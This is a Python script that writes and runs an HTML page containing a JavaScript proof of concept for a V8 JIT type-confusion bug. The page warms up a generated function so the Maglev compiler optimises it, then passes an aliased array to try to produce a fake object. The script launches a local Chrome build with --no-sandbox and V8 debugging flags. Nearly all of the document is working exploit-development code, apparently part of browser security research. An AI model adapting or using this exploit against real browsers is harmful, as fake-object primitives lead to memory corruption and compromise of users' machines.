import subprocess, tempfile

html = """<!doctype html>
<meta charset="utf-8">
<script>
async function run() {
  const lines = ["function trigger(x, v2, v3, obj, limit) {"];
  for (let i = 0; i < 650; i++) lines.push(`if (x === ${i}) return ${i};`);
  lines.push("v2[0] = obj;");
  lines.push("let i = 0, res = 0;");
  lines.push("while (i < limit) {");
  for (let i = 0; i < 430; i++) lines.push(`res = (res + i + ${i % 7}) | 0;`);
  lines.push("res = v3[0] + 0.0;");
  lines.push("Array.prototype.push.call(v3, 4.950618252845e-311);");
  lines.push("i++;");
  lines.push("}");
  lines.push("return res;");
  lines.push("}");
  lines.push("return trigger;");
  const trigger = new Function(lines.join("\\n"))();

  const obj = { marker: 0x1337 };
  function makeObject() { return [{ a: 1 }, { a: 2 }, { a: 3 }]; }
  function makeDouble() { return [1.1, 2.2, 3.3]; }

  console.log("Starting warmup...");
  for (let i = 0; i < 15000; i++) {
    trigger(1000, makeObject(), makeDouble(), obj, 1);
    trigger(1000, makeDouble(), makeDouble(), obj, 1);
  }
  console.log("Warmup done! Sleeping 2500ms for Maglev...");
  await new Promise(r => setTimeout(r, 2500));

  const victim = makeDouble();
  console.log("Calling trigger with aliased victim...");
  try {
    const result = trigger(1000, victim, victim, obj, 1);
    console.log("result:", typeof result, result);
    for (let i = 0; i < 7; i++) {
      console.log("victim" + i, typeof victim[i], victim[i]);
      if (typeof victim[i] === "object") {
        console.log("🔥🔥🔥 FOUND FAKEOBJ AT victim[" + i + "]:", victim[i]);
      }
    }
    console.log("victim length:", victim.length);
  } catch (e) {
    console.log("caught exception:", e && e.name, e && e.message);
  }
  window.close();
}
run();
</script>"""

with open("script/test_public_exact.html", "w") as f:
    f.write(html)

profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt --trace-deopt",
    "http://127.0.0.1:8000/test_public_exact.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=10)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for line in out.splitlines():
    if True:
        print(line)
